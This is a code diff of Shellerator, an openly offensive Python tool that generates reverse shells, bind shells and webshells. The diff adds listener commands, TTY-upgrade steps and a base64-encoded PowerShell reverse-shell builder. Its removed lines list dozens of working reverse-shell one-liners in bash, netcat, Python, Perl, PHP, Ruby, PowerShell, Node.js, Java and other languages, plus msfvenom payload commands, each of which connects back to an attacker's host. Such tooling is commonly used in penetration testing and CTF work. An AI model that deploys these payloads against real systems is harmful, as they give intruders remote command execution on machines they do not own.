@@ -13,9 +13,14 @@ Reverse shells found on :
 
 import argparse
 import sys
-import re
-import psutil
+import json
 import socket
+import base64
+import signal
+import ipaddress
+import os
+
+import psutil
 from colorama import Fore
 from colorama import Style
 import platform
@@ -23,6 +28,12 @@ if platform.system() == 'Windows':
     from consolemenu import *
 else:
     from simple_term_menu import TerminalMenu
+
+def signal_handler(sig, frame):
+    exit(1)
+
+# Handle Ctrl+C key interruption
+signal.signal(signal.SIGINT, signal_handler)
 
 def menu(title, menu_list):
     if platform.system() == 'Windows':
@@ -61,180 +72,200 @@ def select_address():
 
     return menu_with_custom_choice("Listener interface/address?", menu_list)
 
-def list_shells():
-    print(Fore.BLUE + Style.BRIGHT + 'Reverse shells' + Style.RESET_ALL)
-    for shell in sorted(revshells.keys()):
-        print('   - ' + shell)
-    print()
-    print(Fore.BLUE + Style.BRIGHT + 'Bind shells' + Style.RESET_ALL)
-    for shell in sorted(bindshells.keys()):
-        print('   - ' + shell)
-    quit()
+def check_shell_args(shells, args):
+    # Check if the shell type specified by the user is supported by Shellerator
+    try:
+        shells[args.SHELLTYPE][args.TYPE]
+    except KeyError:
+        sys.exit(f"{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} No {args.SHELLTYPE} found for {Fore.RED + Style.BRIGHT}{args.TYPE}{Style.RESET_ALL}! Please run '{Fore.YELLOW + Style.BRIGHT}shellerator -l{Style.RESET_ALL}' to list the supported type of shells!")
 
-def get_options():
-    parser = argparse.ArgumentParser(description='Generate a bind/reverse shell', formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the types of shells shellerator can generate')
-    # Can't choose bind shell and reverse shell
+    # Check if the port number specified by the user is correct (The check is done for reverse/bind shells)
+    if args.SHELLTYPE != "webshells":
+        try:
+            if int(args.LPORT) < 1 or int(args.LPORT) > 65535:
+                raise ValueError
+        except ValueError:
+            sys.exit(f"{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} Port number must be between 1 and 65535")
+
+        # Check if the IP address specified by the user is an IPv4 (The check is only done for reverse shells)
+        if args.SHELLTYPE != "bindshells":
+            try:
+                ip_addr = ipaddress.ip_address(args.LHOST)
+            except ValueError:
+                sys.exit(f"{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} {args.LHOST} does not appear to be an IPv4")
+
+def list_shells(revshells, bindshells, webshells):
+    print(f"{Fore.BLUE + Style.BRIGHT}Reverse shells{Style.RESET_ALL}")
+    for revshell in sorted(revshells.keys()):
+        print(f"   - {revshell}")
+    print(f"\n{Fore.BLUE + Style.BRIGHT}Bindshells{Style.RESET_ALL}")
+    for bindshell in sorted(bindshells.keys()):
+        print(f"   - {bindshell}")
+    print(f"\n{Fore.BLUE + Style.BRIGHT}Webshells{Style.RESET_ALL}")
+    for webshell in sorted(webshells.keys()):
+        print(f"   - {webshell}")
+
+# Return list of listeners for reverse shells
+def get_listeners(lport, verbosity=False):
+    listeners = {
+        'netcat': f"nc -nlvp {lport}",
+        'rlwrap + nc': f"rlwrap -cAr nc -nlvp {lport}",
+        'penelope': f"penelope -p {lport}",
+        'ConPty': f"stty raw -echo; (stty size; cat) | nc -nlvp {lport}",
+        'pwncat (linux)': f"pwncat-cs -lp {lport}",
+        'pwncat (windows)': f"python3 -m pwncat -m windows -lp {lport}",
+        'socat': f'socat file:`tty`,raw,echo=0 TCP-L:{lport}',
+        'ncat (TLS)': f'ncat --ssl -lvnp {lport}',
+        'busybox nc': f'busybox nc -lp {lport}',
+        'powercat': f"powercat -l -p {lport}"
+    }
+    comments = {
+        'rlwrap + nc': f" {Fore.YELLOW + Style.BRIGHT}(Simple alternative for upgrading Windows reverse shells){Style.RESET_ALL}",
+        'penelope': f" {Fore.YELLOW + Style.BRIGHT}(Great for upgrading Linux reverse shells){Style.RESET_ALL}",
+        'ConPty': f" {Fore.YELLOW + Style.BRIGHT}(Great for upgrading Windows reverse shells){Style.RESET_ALL}",
+        'socat': f" {Fore.YELLOW + Style.BRIGHT}(Provides a fully interactive TTY. The Linux target must have Socat installed){Style.RESET_ALL}"
+    }
+
+    return {
+        listener: command + (comments.get(listener, "") if verbosity else "") for listener, command in listeners.items()
+    }
+    
+def format_shell(shell_index, shell, comment):
+    return f"{Fore.BLUE + Style.BRIGHT}[{str(shell_index + 1)}]{Style.RESET_ALL} {shell.strip()}{Fore.YELLOW + Style.BRIGHT} ({comment}){Style.RESET_ALL}" if comment.strip() else f"{Fore.BLUE + Style.BRIGHT}[{str(shell_index + 1)}]{Style.RESET_ALL} {shell.strip()}"
+
+def upgrade_tty(verbosity=False):
+    if verbosity:
+        return f"""\n{Fore.RED + Style.BRIGHT}[Upgrade your TTY]{Style.RESET_ALL}
+{Fore.BLUE + Style.BRIGHT}[1]{Style.RESET_ALL} Execute one of the following commands from your reverse shell to obtain a TTY:
+python -c 'import pty; pty.spawn("/bin/bash")'
+script -q /dev/null -c /bin/bash
+-- 
+{Fore.BLUE + Style.BRIGHT}[2]{Style.RESET_ALL} Press {Fore.YELLOW + Style.BRIGHT}Ctrl+Z{Style.RESET_ALL} to background your TTY, then run:
+stty size{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}(Returns the rows and columns of your current terminal window){Style.RESET_ALL}
+stty raw -echo; fg{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}(Prevents commands from being echoed, enables tab completion, handles Ctrl+C, etc.){Style.RESET_ALL}
+Press {Fore.YELLOW + Style.BRIGHT}[ENTER]{Style.RESET_ALL} to continue
+--
+{Fore.BLUE + Style.BRIGHT}[3]{Style.RESET_ALL} Reset your shell, export the SHELL and TERM environment variables, and set a proper terminal size to avoid text overlapping:
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows `<rows>` columns `<columns>`{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}(Replace `<rows>` and `<columns>` with the values returned by `stty size`){Style.RESET_ALL}
+"""
+    else:
+        return f"""\n{Fore.RED + Style.BRIGHT}[Upgrade your TTY]{Style.RESET_ALL}
+{Fore.BLUE + Style.BRIGHT}[1]{Style.RESET_ALL} Execute any of the following commands from your reverse shell to obtain a TTY:
+python -c 'import pty; pty.spawn("/bin/bash")'
+script -q /dev/null -c /bin/bash{Style.RESET_ALL}
+-
+{Fore.BLUE + Style.BRIGHT}[2]{Style.RESET_ALL} Press {Fore.YELLOW + Style.BRIGHT}Ctrl+Z{Style.RESET_ALL} to background your TTY, then run:
+stty size
+stty raw -echo; fg
+Press {Fore.YELLOW + Style.BRIGHT}[ENTER]{Style.RESET_ALL} to continue
+-
+{Fore.BLUE + Style.BRIGHT}[3]{Style.RESET_ALL} Reset your shell, export the SHELL and TERM environment variables, and set a proper terminal size to avoid text overlapping:
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <rows> columns <columns>
+    """
+      
+def main():
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+    shells_path = os.path.join(BASE_DIR, "data", "shells.json")
+    try:
+        with open(shells_path) as f:
+            shells = json.load(f)
+    except FileNotFoundError:
+        print(f"Error: shells.json not found at '{shells_path}'.", file=sys.stderr)
+        sys.exit(1)
+    except PermissionError:
+        print(f"Error: insufficient permissions to read '{shells_path}'.", file=sys.stderr)
+        sys.exit(1)
+    except json.JSONDecodeError as e:
+        print(f"Error: failed to parse JSON in '{shells_path}': {e}", file=sys.stderr)
+        sys.exit(1)
+    revshells = shells['revshells']
+    bindshells = shells['bindshells']
+    webshells = shells['webshells']
+
+    parser = argparse.ArgumentParser(description='Easily generate reverse, bind and webshells', formatter_class=lambda prog: argparse.HelpFormatter(prog, width=100, max_help_position=40))
+    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Display all type of shells supported by Shellerator')
+    # Can't choose bind shell, reverse shell and webshell simultaneously
     shelltype = parser.add_mutually_exclusive_group()
     shelltype.add_argument('-b', '--bind-shell', dest='SHELLTYPE', action='store_const', const='bindshells', help='Generate a bind shell (you connect to the target)')
     shelltype.add_argument('-r', '--reverse-shell', dest='SHELLTYPE', action='store_const', const='revshells', help='Generate a reverse shell (the target connects to you) (Default)')
-    # Sets reverse shell as default value for SHELLTYPE (https://stackoverflow.com/questions/38507675/python-argparse-mutually-exclusive-group-with-default-if-no-argument-is-given)
-    parser.set_defaults(SHELLTYPE = 'revshells')
+    shelltype.add_argument('-wsh', '--web-shell', dest='SHELLTYPE', action='store_const', const='webshells', help='Generate a webshell')
+    parser.add_argument('-v','--verbose', action='store_true', help="Enable verbosity")
+    # Sets reverse shell as the default shell type
+    parser.set_defaults(SHELLTYPE='revshells')
     # Creates group of options for bindshell
-    bindshell = parser.add_argument_group('Bind shell options')
-    # typeoptions and portoption are two options either bindshell or revshell will need (https://stackoverflow.com/questions/23775378/allowing-same-option-in-different-argparser-group)
-    typeoption = bindshell.add_argument('-t', '--type', dest='TYPE', type=str.lower, help='Type of the shell to generate (Bash, Powershell, Java...)')
+    bindshell = parser.add_argument_group('Bindshell options')
+    # typeoption, portoption  are required for bindshells and revshells (https://stackoverflow.com/questions/23775378/allowing-same-option-in-different-argparser-group)
+    typeoption = bindshell.add_argument('-t', '--type', dest='TYPE', type=str.lower, help='Type of shell to generate')
     portoption = bindshell.add_argument('-lp', '--lport', dest='LPORT', type=str, help='Listener Port')
     revshell = parser.add_argument_group('Reverse shell options')
     revshell._group_actions.append(typeoption)
-    revshell.add_argument('-lh', '--lhost', dest='LHOST', type=str, help='Listener IP address')
     revshell._group_actions.append(portoption)
-    options = parser.parse_args()
-    if options.LIST:
-        list_shells()
-    if options.SHELLTYPE == 'revshells' and not options.LHOST:
-        options.LHOST = select_address()
-    if not options.LPORT:
+    revshell.add_argument('-lh', '--lhost', dest='LHOST', type=str, help='Listener IP address')
+    # Only the shell type is required for webshells
+    webshell = parser.add_argument_group('Webshell options')
+    webshell._group_actions.append(typeoption)
+    args = parser.parse_args()
+    if args.LIST:
+        list_shells(revshells, bindshells, webshells)
+        sys.exit(0)
+    if args.SHELLTYPE == 'revshells' and not args.LHOST:
+        args.LHOST = select_address()
+    if args.SHELLTYPE != 'webshells' and not args.LPORT:
         menu_list = [
-            'L33t (1337)',
-            'HTTPS (443)',
             'HTTP (80)',
+            'HTTPS (443)',
             'DNS (53)',
+            'L33t (1337)'
         ]
-        options.LPORT = menu_with_custom_choice("Listener port?", menu_list)
-    if not options.TYPE:
-        shells_dict = globals()[options.SHELLTYPE]
-        menu_list = sorted(list(shells_dict.keys()))
-        options.TYPE = menu('What type of shell do you want?', menu_list)
-    return options
+        args.LPORT = menu_with_custom_choice("Listener port?", menu_list)
+    if not args.TYPE:
+        if args.SHELLTYPE == 'revshells':
+            menu_list = sorted(revshells.keys())
+        elif args.SHELLTYPE == "bindshells":
+            menu_list = sorted(bindshells.keys())
+        else:
+            menu_list = sorted(webshells.keys())
+        args.TYPE = menu('What type of shell do you want?', menu_list)
+    
+    # Check user specified arguments (shell type, port number and IP address)
+    check_shell_args(shells, args)
 
-# Helper function for populate_shells() to add values to the dictionnaries
-def add_shell(shells_dict, type, shell, notes=None):
-    if not type in shells_dict.keys():
-        shells = []
+    print(f"{Fore.RED + Style.BRIGHT}[{args.SHELLTYPE.capitalize()}]{Style.RESET_ALL}")
+    if args.SHELLTYPE == "revshells":
+        for shell_index, revshell in enumerate(revshells[args.TYPE]):
+            shell = revshell['command'].replace('{LHOST}', args.LHOST).replace('{LPORT}', args.LPORT)
+            comment = revshell['comments'].strip()
+            if args.TYPE == "powershell" and shell_index == 4:
+                shell_utf16 = revshells[args.TYPE][0]['command'].replace("'",'"').replace('{LHOST}', args.LHOST).replace('{LPORT}', args.LPORT).encode('utf-16le')
+                # pwsh_base64_revshell
+                shell = "powershell -e " + base64.b64encode(shell_utf16).decode()
+            if shell:
+                print(format_shell(shell_index, shell, comment))
+        # Display listeners
+        print(f"\n{Fore.RED + Style.BRIGHT}[Listeners] {Style.RESET_ALL}")
+        listeners = get_listeners(args.LPORT, args.verbose)
+        for listener_index, command in enumerate(listeners):
+            print(f"{Fore.BLUE + Style.BRIGHT}[{listener_index + 1}]{Style.RESET_ALL} {command}: {listeners[command]}")
+        # Display help menu for upgrading the TTY
+        print(upgrade_tty(args.verbose))
+    elif args.SHELLTYPE == "bindshells":
+        for shell_index, bindshell in enumerate(bindshells[args.TYPE]):
+            shell = bindshell['command'].replace('{LPORT}', args.LPORT)
+            comment = bindshell['comments'].strip()
+            print(format_shell(shell_index, shell, comment))
+        print(upgrade_tty(args.verbose))
     else:
-        shells = shells_dict[type]
-    shells.append((notes, shell))
-    shells_dict.update({type:shells})
-
-# Add shells to the main dictionnaries: revshells and bindshells
-def populate_shells():
-    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ''')
-    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1' ''')
-    add_shell(revshells, 'bash', '''/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1''')
-    add_shell(revshells, 'bash', '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''')
-    add_shell(revshells, 'bash', '''exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done''')
-    add_shell(revshells, 'bash', '''exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0''')
-    add_shell(revshells, 'bash', '''0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196''')
-    add_shell(shells_dict=revshells, type='bash', notes='UDP', shell='''bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1''')
-    add_shell(shells_dict=revshells, type='bash', notes='UDP Listener (attacker)', shell='''nc -u -lvp {LPORT}''')
-    add_shell(revshells, 'netcat', '''nc -e /bin/sh {LHOST} {LPORT}''')
-    add_shell(revshells, 'netcat', '''nc -e /bin/bash {LHOST} {LPORT}''')
-    add_shell(revshells, 'netcat', '''nc -c bash {LHOST} {LPORT}''')
-    add_shell(revshells, 'netcat', '''mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe ''')
-    add_shell(revshells, 'netcat', '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f''')
-    add_shell(revshells, 'netcat', '''rm -f /tmp/p; mknod /tmp/p p && nc {LHOST} {LPORT} 0/tmp/p 2>&1''')
-    add_shell(revshells, 'netcat', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > f''')
-    add_shell(revshells, 'netcat', '''rm -f x; mknod x p && nc {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
-    add_shell(revshells, 'ncat', '''ncat {LHOST} {LPORT} -e /bin/bash''')
-    add_shell(revshells, 'ncat', '''ncat --udp {LHOST} {LPORT} -e /bin/bash''')
-    add_shell(revshells, 'telnet', '''rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1''')
-    add_shell(revshells, 'telnet', '''telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667''')
-    add_shell(revshells, 'telnet', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > f''')
-    add_shell(revshells, 'telnet', '''rm -f x; mknod x p && telnet {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
-    add_shell(revshells, 'socat', '''/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
-    add_shell(revshells, 'socat', '''socat tcp-connect:{LHOST}:{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane''')
-    add_shell(revshells, 'socat', '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
-    add_shell(shells_dict=revshells, type='socat', notes='Listener (attacker)', shell='''socat file:`tty`,raw,echo=0 TCP-L:{LPORT}''')
-    add_shell(revshells, 'perl', '''perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''')
-    add_shell(revshells, 'perl', '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
-    add_shell(shells_dict=revshells, type='perl', notes='Windows', shell='''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
-    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
-    add_shell(revshells, 'python', '''export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ''')
-    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ''')
-    add_shell(shells_dict=revshells, type='python', notes='Windows', shell='''C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"''')
-    add_shell(revshells, 'php', '''php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");' ''')
-    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);' ''')
-    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");' ''')
-    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});`/bin/sh -i <&3 >&3 2>&3`;' ''')
-    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");' ''')
-    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");' ''')
-    add_shell(revshells, 'php', '''php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}' ''')
-    add_shell(revshells, 'ruby', '''ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''')
-    add_shell(revshells, 'ruby', '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
-    add_shell(shells_dict=revshells, type='ruby', notes='Windows', shell='''ruby -rsocket -e 'c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
-    add_shell(revshells, 'openssl', '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s''')
-    add_shell(shells_dict=revshells, type='openssl', notes='Listener (attacker)', shell='''ncat --ssl -vv -l -p {LPORT}''')
-    add_shell(revshells, 'powershell', '''$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''')
-    add_shell(revshells, 'awk', '''awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''')
-    add_shell(revshells, 'tclsh', '''echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh''')
-    add_shell(revshells, 'java', '''r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()''')
-    add_shell(revshells, 'java', '''String host="{LPORT}";
-int port={LPORT};
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
-    add_shell(shells_dict=revshells, type='java', notes='More stealthy', shell='''Thread thread = new Thread(){public void run(){        //Reverse shell here        }}thread.start();''')
-    add_shell(revshells, 'war', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > reverse.war
-strings reverse.war | grep jsp # in order to get the name of the file''')
-    add_shell(shells_dict=revshells, type='lua', notes='Linux', shell='''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''')
-    add_shell(shells_dict=revshells, type='lua', notes='Windows', shell='''lua5.1 -e 'local host, port = "{LHOST}", {LPORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''')
-    add_shell(revshells, 'nodejs', '''require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')''')
-    add_shell(revshells, 'nodejs', '''-var x = global.process.mainModule.require
--x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')''')
-    add_shell(revshells, 'nodejs', '''(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect({LPORT}, "{LHOST}", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application form crashing
-})();''')
-    add_shell(revshells, 'groovy', '''String host="{LHOST}";
-int port={LPORT};
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
-    add_shell(shells_dict=revshells, type='groovy', notes='More stealthy', shell='''Thread.start {        // Reverse shell here        }''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f elf > shell.elf''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f exe > shell.exe''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f macho > shell.macho''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f asp > shell.asp''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.jsp''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f war > shell.war''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_python LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.py''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_bash LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.sh''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_perl LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.pl''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Staged reverse TCP', shell='''msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Stageless reverse TCP', shell='''msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Staged reverse TCP', shell='''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Stageless reverse TCP', shell='''msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
-
-    add_shell(bindshells, 'netcat', '''nc -lvp {LPORT} -e /bin/sh''')
+        for shell_index, webshell in enumerate(webshells[args.TYPE]):
+            shell = webshell['command']
+            comment = webshell['comments'].strip()
+            print(format_shell(shell_index, shell, comment))
+        print(upgrade_tty(args.verbose))
 
 if __name__ == '__main__':
-    revshells = {}
-    bindshells = {}
-    populate_shells()
-    options = get_options()
-    shells_dict = globals()[options.SHELLTYPE]
-    print()
-    for notes, shell in shells_dict[options.TYPE]:
